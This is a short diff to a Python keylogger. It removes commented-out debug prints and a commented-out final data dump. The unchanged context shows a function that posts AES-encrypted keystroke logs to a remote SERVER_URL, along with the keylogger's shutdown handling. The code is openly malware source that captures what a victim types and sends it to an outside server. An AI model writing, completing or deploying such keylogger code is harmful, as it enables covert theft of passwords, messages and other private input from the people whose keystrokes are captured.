@@ -251,10 +251,6 @@ def send_data_batch():
     }
 
     try:
-        # print("Encryped AES key length (bytes):", len(encrypted_aes_key))
-        # print("Encrypted AES key (base64) length:", encrypted_aes_key_b64)
-        # print("AES key (hex):", SYMMETRIC_KEY.hex())
-        # print("Encrypted log content length (bytes):", len(encrypted_log_content))
         response = requests.post(SERVER_URL, json=data)
         response.raise_for_status()
         print(f"Data sent successfully. Server response: {response.status_code}")
@@ -292,12 +288,6 @@ if __name__ == "__main__":
         print("\n-------------------------")
         print("Keylogger Stopped by User (Ctrl+C).")
         
-        # dump any remaining collected keys before exiting
-        # if collected_keys:
-        #     print("Dumping final batch of collected keys...")
-        #     send_data_batch() # call dump_data_batch for any remaining data
-        
-        # print("-------------------------")
     finally:
         # ensure the listener thread is stopped when the main thread exits
         listener.stop() 
